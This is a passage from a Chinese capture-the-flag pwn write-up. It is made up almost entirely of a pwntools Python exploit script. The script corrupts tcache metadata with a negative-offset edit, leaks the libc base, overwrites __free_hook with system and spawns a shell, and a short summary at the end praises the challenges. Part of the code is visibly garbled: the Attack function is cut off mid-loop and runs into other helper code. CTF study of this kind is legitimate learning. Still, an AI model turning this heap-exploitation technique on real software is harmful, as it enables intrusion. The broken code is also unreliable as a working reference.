        return context.binary
    def get_libc(dic=""):
        libc = None
        try:
            data = os.popen("ldd {}".format(dic + file_name)).read()
            for i in data.split('\n'):
                libc_info = i.split("=>")
                if len(libc_info) == 2:
                    if "libc" in libc_info[0]:
                        libc_path = libc_info[1].split(' (')
                        if len(libc_path) == 2:
                            libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                            return libc
        except:
            pass
        if context.arch == 'amd64':
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        elif context.arch == 'i386':
            try:
                libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
            except:
                libc = ELF("/lib32/libc.so.6", checksec=False)
        return libc
    def get_sh(Use_other_libc=False, Use_ssh=False):
        global libc
        if args['REMOTE']:
            if Use_other_libc:
                libc = ELF("./libc.so.6", checksec=False)
            if Use_ssh:
                s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
                return s.process(file_name)
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process(file_name)
    def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                    int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if libc == True:
            return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
        elif int_mode:
            return_address = int(sh.recvuntil(end_string, drop=True), 16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
        elif context.arch == 'amd64':
            return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
        else:
            return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.recvrepeat(0.1)
        sh.sendline('cat flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh, gdbscript=None, addr=0, stop=False):
        if args['REMOTE']:
            return
        if gdbscript is not None:
            gdb.attach(sh, gdbscript=gdbscript)
        elif addr is not None:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(sh.pid)).readlines()[1], 16)
            log.success("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(sh, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(sh)
        if stop:
            raw_input()
    def Attack(target=None, sh=None, elf=None, libc=None):
        if sh is None:
            from Class.Target import Target
            assert target is not None
            assert isinstance(target, Target)
            sh = target.sh
            elf = target.elf
            libc = target.libc
        assert isinstance(elf, ELF)
        assert isinstance(libc, ELF)
        try_count = 0
        while try_count  ", str(idx))
    def add(size, content):
        choice(1)
        sh.sendlineafter("size> ", str(size))
        sh.sendlineafter('msg> ', content)
    def edit(idx, offset, content):
        choice(2)
        sh.sendlineafter("idx> ", str(idx))
        sh.sendlineafter("offset> ", str(offset))
        sh.sendafter("msg> ", content)
    def delete(idx):
        choice(3)
        sh.sendlineafter("idx> ", str(idx))
    def show(idx):
        choice(4)
        sh.sendlineafter("idx> ", str(idx))
    def pwn(sh, elf, libc):
        context.log_level = "debug"
        add(0x58, 'sh\x00')  # 0
        add(0x2c4, 'wjh')  # 1
        add(0x168, 'wjh')  # 2
        add(0x88, 'wjh')  # 3
        add(0x88, 'wjh')  # 4
        delete(4)
        edit(1, -0x80000000, p64(0) + p64(0x251) + '\x00' * 7 + '\x07' + '\x00' * (0x78 - 8) + '\n')
        add(0x88, 'wjh')  # 5
        edit(1, -0x80000000, p64(0) + p64(0x251) + '\x00' * 7 + '\x07' + '\x00' * (0x78 - 8) + '\n')
        delete(3)
        show(5)
        libc_base = get_address(sh, True, info='libc_base:\t', offset=-0x3ebca0)
        free_hook_addr = libc_base + 0x3ed8e8
        system_addr = libc_base + 0x4f550
        edit(1, -0x80000000, p64(0) + p64(0x251) + '\x00' * 7 + '\x01' + '\x00' * (0x78 - 8) + p64(free_hook_addr) + '\n')
        add(0x88, p64(system_addr))
        # gdb.attach(sh, "b *$rebase(0x0000000000000E43)")
        delete(0)
        sh.interactive()
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
        sh.close()
        log.success('The flag is ' + re.search(r'flag{.+}', flag).group())
## 总结
这次的 PWN 的题目虽然难度适中，但是很有新意，有我最喜欢的构造 shellcode
的题目，也有比较有创意的向前溢出堆题，这些题目的利用方法和分析过程都非常值得大家学习。侧信道的题目在目前已经出现过好多次了，从一个新颖的手法转变成为一个应该比较熟悉的利用方法，在我的
EXP 中存在其他 Writeup 从来未有的二分查找来快速确定字节内容，这样的方法速度相较于传统方法要快很多，我认为值得大家当做一个模板存下来。